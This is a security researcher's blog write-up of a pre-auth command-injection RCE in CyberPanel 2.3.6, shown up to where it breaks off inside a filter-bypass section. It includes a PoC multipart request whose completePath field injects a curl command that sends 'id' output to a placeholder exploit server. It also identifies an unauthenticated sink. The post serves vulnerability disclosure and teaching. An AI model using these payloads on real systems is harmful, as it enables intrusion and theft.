<!DOCTYPE html>
<html lang="en">

<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
<link rel="stylesheet" href="/assets/css/style.css">
<title>What Are My OPTIONS? CyberPanel v2.3.6 pre-auth RCE </title>
<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>What Are My OPTIONS? CyberPanel v2.3.6 pre-auth RCE | DreyAnd’s Web Security Blog</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="What Are My OPTIONS? CyberPanel v2.3.6 pre-auth RCE" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Few months ago I was assigned to do a pentest on a target running CyberPanel. It seemed to be installed by default by some VPS providers &amp; it was also sponsored by Freshworks." />
<meta property="og:description" content="Few months ago I was assigned to do a pentest on a target running CyberPanel. It seemed to be installed by default by some VPS providers &amp; it was also sponsored by Freshworks." />
<meta property="og:site_name" content="DreyAnd’s Web Security Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-10-27T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="What Are My OPTIONS? CyberPanel v2.3.6 pre-auth RCE" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-10-27T00:00:00+00:00","datePublished":"2024-10-27T00:00:00+00:00","description":"Few months ago I was assigned to do a pentest on a target running CyberPanel. It seemed to be installed by default by some VPS providers &amp; it was also sponsored by Freshworks.","headline":"What Are My OPTIONS? CyberPanel v2.3.6 pre-auth RCE","mainEntityOfPage":{"@type":"WebPage","@id":"/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce.html"},"url":"/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce.html"}</script>
<!-- End Jekyll SEO tag -->


<script type="text/javascript" src="/assets/js/darkmode.js"></script>

<meta property="og:title" content="What Are My OPTIONS? CyberPanel v2.3.6 pre-auth RCE ">
  <meta property="og:image" content="/assets/images/default.png">
  <meta property="og:url" content="/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce.html">
  <meta property="og:type" content="article">

</head><body>
  <main class="container">
    <section class="about">
      <div class="about-header condensed">
      <div class="about-title">
      <a href="/">
        
        <img src="/assets/portfolio-modified.png" alt="DreyAnd" />
        
      </a>
      <h2 id="title">
        <a href="/">DreyAnd</a>
      </h2>
      </div><p class="tagline">WebSec. CTFs. Research.</p></div>
      
      <ul class="social about-footer condensed"><a href="https://github.com/DreyAnd" target="_blank">
          <li>
            <i class="icon-github-circled"></i>
          </li>
        </a><a href="https://twitter.com/dreyand_" target="_blank">
          <li>
            <i class="icon-twitter-squared"></i>
          </li>
        </a></ul><p class="about-footer condensed">&copy;
        2024</p><div class="about-footer condensed">
        <p>Dark Mode
          <i class="icon-moon"></i>
          <label class="switch">
            <input type="checkbox" class="dark-mode-toggle">
            <span class="slider round" onclick="toggleDarkMode()"></span>
          </label>
        </p>
      </div>
    </section>
    <section class="content">
      <div class="post-container">
  <a class="post-link" href="/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce.html">
    <h2 class="post-title">What Are My OPTIONS? CyberPanel v2.3.6 pre-auth RCE </h2>
  </a>
  <div class="post-meta">
    <div class="post-date"><i class="icon-calendar"></i>Oct 27, 2024</div><ul class="post-categories"><li>Code</li><li>Review</li></ul></div>
  <div class="post">
    <p>Few months ago I was assigned to do a pentest on a target running <a href="https://github.com/usmannasir/cyberpanel">CyberPanel</a>. It seemed to be installed by default by some VPS providers &amp; it was also sponsored by <a href="https://www.freshworks.com/">Freshworks</a>.</p>

<p>I was clueless on how to pwn the target as the functionalities were very limited, so I thought about it differently, let’s just find a 0day ¯\_(ツ)_/¯ .</p>

<p>This lead to a <strong>0-click pre-auth root RCE</strong> on the latest version (2.3.6 as of now).<del>It’s currently still “unpatched”, as in, the maintainers have been notified, a patch has been done but still waiting for the CVE &amp; for the fix to make the make it to he main release</del>.
Update as of October 30, two CVEs have been assigned:</p>
<ul>
  <li>CVE-2024-51567</li>
  <li>CVE-2024-51568</li>
</ul>

<p>Along a security announcement from the maintainers.</p>

<p>. You can find the patch commit at <a href="https://github.com/usmannasir/cyberpanel/commit/5b08cd6d53f4dbc2107ad9f555122ce8b0996515">https://github.com/usmannasir/cyberpanel/commit/5b08cd6d53f4dbc2107ad9f555122ce8b0996515</a> .</p>

<p>I also did a large scale scan on bug bounty programs and a couple hosts were affected - thanks <a href="https://x.com/iustinBB">iustin</a> for helping out!</p>

<p>I feel like this writeup also documents my mental model while auditing various projects, so if you’re a beginner with a creative mind looking to get started with code review, I definitely recommend you read this blog.</p>

<h2 id="codebase-structure">Codebase Structure:</h2>

<p>It’s actually a quite simple <strong>Django</strong> web-app. It’s actual purpose is to setup various system services on a VPS (such as FTP, SSH, SMTP, IMAP, etc).</p>

<p>When landing on the main page we’re only greeted with a login functionality, so it <em>appears</em> like we don’t have much to play with :/</p>

<p><img src="https://imgur.com/cJ3pZqz.png" alt="Image" /></p>

<p>Well, that’s just the top of the iceberg anyways.</p>

<p>As with any Django project, and we should always take a look at how the framework works before checking the actual project, the pattern is like so:</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">X/urls.py</code> -&gt; this file will contain all the API routes for functionality X.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">X/views.py</code>-&gt; this file will contain all the Controllers that the routes of functionality X map to.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">X/views</code> -&gt; templates that dynamically generate HTML of the page.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">X/static</code> -&gt; static files and other bs. …</p>
  </li>
</ul>

<p>Since those usually contain the logic for authentication and etc. it was the first thing I started checking naturally , something that I saw right off the bat is that they were applying authentication checks for every route one-by-one.</p>

<p>My first questions is - why? You’d expect someone to use an auth middleware or whatever and not have to buzz himself writting an auth check on every route.</p>

<p>The next thought that came to my mind right after was: “Man, If I was to write code like this I’d definitely miss checking auth on a couple of routes” - and yes, that’s exactly what happened here :)</p>

<h2 id="analysis-of-an-n-day-for-codebase-insights">Analysis of an N-day for codebase insights:</h2>

<p>Usually when I try to get more comfortable with a target, I always read writeups/exploits/docs of previous bugs and it helps learn about the target so much.</p>

<p>I noticed the following security release back in 2.3.5 - <a href="https://cyberpanel.net/blog/cyberpanel-v2-3-5">https://cyberpanel.net/blog/cyberpanel-v2-3-5</a></p>

<blockquote>
  <p>Authentication Bypass in File Manager’s Upload Functionality: A vulnerability in the File Manager upload functionality, caused by a human error, has been rectified in version 2.3.5.</p>
</blockquote>

<ul>
  <li><code class="language-plaintext highlighter-rouge">caused by human error</code> .. heh that doesn’t surprise me.</li>
</ul>

<p>So it definitely gave me an idea to start analysing this patch to get more inner info about the codebase.</p>

<p>Let’s take a look at the commit before the patch in <code class="language-plaintext highlighter-rouge">filemanager/views.py</code> <a href="https://github.com/usmannasir/cyberpanel/blob/fe3fa850e81db69479e62b5f5bcb7b83ae3488e1/filemanager/views.py">https://github.com/usmannasir/cyberpanel/blob/fe3fa850e81db69479e62b5f5bcb7b83ae3488e1/filemanager/views.py</a>:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>

        <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">POST</span>

        <span class="k">try</span><span class="p">:</span>

            <span class="n">userID</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">userID</span><span class="sh">'</span><span class="p">]</span>
            <span class="n">admin</span> <span class="o">=</span> <span class="n">Administrator</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">pk</span><span class="o">=</span><span class="n">userID</span><span class="p">)</span>
            <span class="n">currentACL</span> <span class="o">=</span> <span class="n">ACLManager</span><span class="p">.</span><span class="nf">loadedACL</span><span class="p">(</span><span class="n">userID</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">ACLManager</span><span class="p">.</span><span class="nf">checkOwnership</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">domainName</span><span class="sh">'</span><span class="p">],</span> <span class="n">admin</span><span class="p">,</span> <span class="n">currentACL</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="k">pass</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">ACLManager</span><span class="p">.</span><span class="nf">loadErrorJson</span><span class="p">()</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>

        <span class="n">fm</span> <span class="o">=</span> <span class="nc">FM</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">fm</span><span class="p">.</span><span class="nf">upload</span><span class="p">()</span>

    <span class="k">except</span> <span class="nb">KeyError</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="n">loadLoginPage</span><span class="p">)</span>
</code></pre></div></div>

<p>If you look closely, there’s two “checks” we’d need to bypass before we reach <code class="language-plaintext highlighter-rouge">fm.upload()</code>:</p>

<ol>
  <li>
    <p><code class="language-plaintext highlighter-rouge">userID = request.session['userID']</code></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">admin = Administrator.objects.get(pk=userID)</code></p>
  </li>
</ol>

<p>The first check gets our <code class="language-plaintext highlighter-rouge">userId</code> from the Django’s inner <code class="language-plaintext highlighter-rouge">session</code> object. The second on is a call to Django’s ORM to get info whether we’re an admin or not.</p>

<p>Well, to my surprise both of these actually throw an exception, where the first one tries to access a key that doesn’t exist, and the <code class="language-plaintext highlighter-rouge">object.get()</code> just being default <a href="https://docs.djangoproject.com/en/5.1/topics/db/queries/#retrieving-a-single-object-with-get">Django ORM behavior</a>:</p>

<blockquote>
  <p>If there are no results that match the query, <strong>get()</strong> will raise a <strong>DoesNotExist</strong> exception.</p>
</blockquote>

<p>Welp, we need an un-auth bug, so we will pretty much fail both - however the code has a clear logical issue since the <code class="language-plaintext highlighter-rouge">fm.upload()</code> is outside of the try/except and will work regardless LOL. Whoever found this had a good pair of glasses!</p>

<p>Let’s take a look at <code class="language-plaintext highlighter-rouge">upload()</code> method:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>

            <span class="n">finalData</span> <span class="o">=</span> <span class="p">{}</span>
            <span class="n">finalData</span><span class="p">[</span><span class="sh">'</span><span class="s">uploadStatus</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
            <span class="n">finalData</span><span class="p">[</span><span class="sh">'</span><span class="s">answer</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">File transfer completed.</span><span class="sh">'</span>

            <span class="n">ACLManager</span><span class="p">.</span><span class="nc">CreateSecureDir</span><span class="p">()</span>
            <span class="n">UploadPath</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/usr/local/CyberCP/tmp/</span><span class="sh">'</span>

            <span class="c1">## Random file name
</span>
            <span class="n">RanddomFileName</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span> <span class="mi">9999</span><span class="p">))</span>

            <span class="n">myfile</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">FILES</span><span class="p">[</span><span class="sh">'</span><span class="s">file</span><span class="sh">'</span><span class="p">]</span>
            <span class="n">fs</span> <span class="o">=</span> <span class="nc">FileSystemStorage</span><span class="p">()</span>

            <span class="k">try</span><span class="p">:</span>
                <span class="n">filename</span> <span class="o">=</span> <span class="n">fs</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">RanddomFileName</span><span class="p">,</span> <span class="n">myfile</span><span class="p">)</span>
                <span class="n">finalData</span><span class="p">[</span><span class="sh">'</span><span class="s">fileName</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">fs</span><span class="p">.</span><span class="nf">url</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
            <span class="k">except</span> <span class="nb">BaseException</span> <span class="k">as</span> <span class="n">msg</span><span class="p">:</span>
                <span class="n">logging</span><span class="p">.</span><span class="nf">writeToFile</span><span class="p">(</span><span class="sh">'</span><span class="s">%s. [375:upload]</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">msg</span><span class="p">)))</span>



            <span class="n">domainName</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">domainName</span><span class="sh">'</span><span class="p">]</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">pathCheck</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/home/%s</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">domainName</span><span class="sh">'</span><span class="p">])</span>
                <span class="n">website</span> <span class="o">=</span> <span class="n">Websites</span><span class="p">.</span><span class="n">objects</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">domain</span><span class="o">=</span><span class="n">domainName</span><span class="p">)</span>

                <span class="n">command</span> <span class="o">=</span> <span class="sh">'</span><span class="s">ls -la %s</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">completePath</span><span class="sh">'</span><span class="p">])</span>
                <span class="n">result</span> <span class="o">=</span> <span class="n">ProcessUtilities</span><span class="p">.</span><span class="nf">outputExecutioner</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">website</span><span class="p">.</span><span class="n">externalApp</span><span class="p">)</span>
                <span class="c1">#
</span>                <span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">-&gt;</span><span class="sh">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">ajaxPre</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">Symlink attack.</span><span class="sh">"</span><span class="p">)</span>

                <span class="k">if</span> <span class="n">ACLManager</span><span class="p">.</span><span class="nf">commandInjectionCheck</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">completePath</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">myfile</span><span class="p">.</span><span class="n">name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">ajaxPre</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">Not allowed to move in this path, please choose location inside home!</span><span class="sh">'</span><span class="p">)</span>

                <span class="nf">if </span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">completePath</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">myfile</span><span class="p">.</span><span class="n">name</span><span class="p">).</span><span class="nf">find</span><span class="p">(</span><span class="n">pathCheck</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span>
                        <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">completePath</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">myfile</span><span class="p">.</span><span class="n">name</span><span class="p">)).</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">..</span><span class="sh">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">ajaxPre</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">Not allowed to move in this path, please choose location inside home!</span><span class="sh">'</span><span class="p">)</span>

            <span class="p">...</span> <span class="n">irrelevant</span> <span class="n">code</span> <span class="bp">...</span>
</code></pre></div></div>

<p>Huh, well, seems like we’re using subprocess to read files now! Good for us I guess, this is something to note down for later!</p>

<p>You can guess the bug at this point, it’s a simple Command Injection via <code class="language-plaintext highlighter-rouge">completePath</code> via <code class="language-plaintext highlighter-rouge">ProcessUtilities.outputExecutioner()</code> sink.</p>

<ul>
  <li>Note: It’s not possible (afaik) to do this exploit with <code class="language-plaintext highlighter-rouge">domainName</code> since our ORM check will fail as described earlier.</li>
</ul>

<p>I also made a quick PoC, I have no idea if it’s a new variant of the bug since RCE is not mentioned anywhere, but I suppose the same patch fixes it:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/filemanager/upload</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">&lt;target&gt;</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=----NewBoundary123456789</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">csrftoken=&lt;CSRF-TOKEN&gt;</span>
<span class="na">X-Csrftoken</span><span class="p">:</span> <span class="s">&lt;CSRF-TOKEN&gt;</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">494</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">https://&lt;target&gt;:8090/</span>

------NewBoundary123456789
Content-Disposition: form-data; name="domainName"

&lt;target&gt;
------NewBoundary123456789
Content-Disposition: form-data; name="completePath"

; curl -X POST https://&lt;exploit-server&gt; -d "pwn=$(id)"
------NewBoundary123456789
Content-Disposition: form-data; name="file"; filename="poc.txt"

pwn
------NewBoundary123456789--
</code></pre></div></div>

<p>Anyways, let’s do a TLDR of the knowledge we have so far:</p>

<ul>
  <li>
    <p>Authentication checks are done per-API route via <code class="language-plaintext highlighter-rouge">request.session['userID']</code> and Django’s ORM.</p>
  </li>
  <li>
    <p>They love piping things to subprocess.</p>
  </li>
  <li>
    <p>They love messing up order of things.</p>
  </li>
  <li>
    <p>They love forgetting things.</p>
  </li>
  <li>
    <p>FYI: Many endpoints just allow you interact with them un-auth by just passing userID=1 to the controller. Hope this gives people a hint if they want to find more bugs :)</p>
  </li>
</ul>

<h2 id="finding-the-0day">Finding the 0day:</h2>

<ul>
  <li>At this point, I used <a href="https://semgrep.dev/">Semgrep</a> to grep out potential interesting pieces of code and one of them immediately popped up:</li>
</ul>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">upgrademysqlstatus</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
        <span class="n">statusfile</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">statusfile</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">installStatus</span> <span class="o">=</span> <span class="n">ProcessUtilities</span><span class="p">.</span><span class="nf">outputExecutioner</span><span class="p">(</span><span class="sh">"</span><span class="s">sudo cat </span><span class="sh">"</span> <span class="o">+</span> <span class="n">statusfile</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">installStatus</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">[200]</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>

            <span class="n">command</span> <span class="o">=</span> <span class="sh">'</span><span class="s">sudo rm -f </span><span class="sh">'</span> <span class="o">+</span> <span class="n">statusfile</span>
            <span class="n">ProcessUtilities</span><span class="p">.</span><span class="nf">executioner</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

            <span class="n">final_json</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span>
                <span class="sh">'</span><span class="s">error_message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"</span><span class="s">None</span><span class="sh">"</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">requestStatus</span><span class="sh">'</span><span class="p">:</span> <span class="n">installStatus</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">abort</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">installed</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
            <span class="p">})</span>
            <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="n">final_json</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">installStatus</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">[404]</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="n">command</span> <span class="o">=</span> <span class="sh">'</span><span class="s">sudo rm -f </span><span class="sh">'</span> <span class="o">+</span> <span class="n">statusfile</span>
            <span class="n">ProcessUtilities</span><span class="p">.</span><span class="nf">executioner</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
            <span class="n">final_json</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span>
                <span class="sh">'</span><span class="s">abort</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">installed</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">error_message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"</span><span class="s">None</span><span class="sh">"</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">requestStatus</span><span class="sh">'</span><span class="p">:</span> <span class="n">installStatus</span><span class="p">,</span>
            <span class="p">})</span>
            <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="n">final_json</span><span class="p">)</span>

        <span class="k">else</span><span class="p">:</span>
            <span class="n">final_json</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span>
                <span class="sh">'</span><span class="s">abort</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">error_message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"</span><span class="s">None</span><span class="sh">"</span><span class="p">,</span>
                <span class="sh">'</span><span class="s">requestStatus</span><span class="sh">'</span><span class="p">:</span> <span class="n">installStatus</span><span class="p">,</span>
            <span class="p">})</span>
            <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="n">final_json</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">KeyError</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="n">loadLoginPage</span><span class="p">)</span>
</code></pre></div></div>

<p>WHAT? This just has no authentication checks &amp; it was added in a very recent commit? Someone must’ve missed it or else it wouldn’t be so easy.</p>

<p>Let’s try trigger a PoC for this: <img src="https://imgur.com/SDJb6WP.png" alt="Image" /></p>

<p>Huh.. since when is there a filter for malicious characters? Welp, they actually did think of implementing a middleware, a security one as well called <code class="language-plaintext highlighter-rouge">secMiddleware</code> :O .</p>

<h2 id="bypassing-the-secmiddleware">Bypassing the secMiddleware:</h2>

<p>The code is a bit lengthy, so I’ll attach a shortened version:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">secMiddleware</span><span class="p">:</span>
    <span class="n">HIGH</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">LOW</span> <span class="o">=</span> <span class="mi">1</span>

    <span class="k">def</span> <span class="nf">get_client_ip</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">META</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">HTTP_CF_CONNECTING_IP</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">ip</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">META</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">REMOTE_ADDR</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">ip</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">get_response</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">get_response</span> <span class="o">=</span> <span class="n">get_response</span>

    <span class="bp">...</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
                <span class="k">try</span><span class="p">:</span>

                    <span class="c1"># logging.writeToFile(request.body)
</span>                    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
                    <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">data</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
                        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">gitNotify</span><span class="sh">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                            <span class="k">break</span>
                        <span class="k">if</span> <span class="nf">type</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span> <span class="ow">or</span> <span class="nf">type</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="o">==</span> <span class="nb">bytes</span><span class="p">:</span>
                            <span class="k">pass</span>
                        <span class="k">elif</span> <span class="nf">type</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="o">==</span> <span class="nb">list</span><span class="p">:</span>
                            <span class="k">for</span> <span class="n">items</span> <span class="ow">in</span> <span class="n">value</span><span class="p">:</span>
                                <span class="k">if</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">- -</span><span class="sh">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">;</span><span class="sh">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span>
                                        <span class="sh">'</span><span class="s">&amp;&amp;</span><span class="sh">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">|</span><span class="sh">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">...</span><span class="sh">'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> \
                                        <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">`</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">$</span><span class="sh">"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">items</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span>
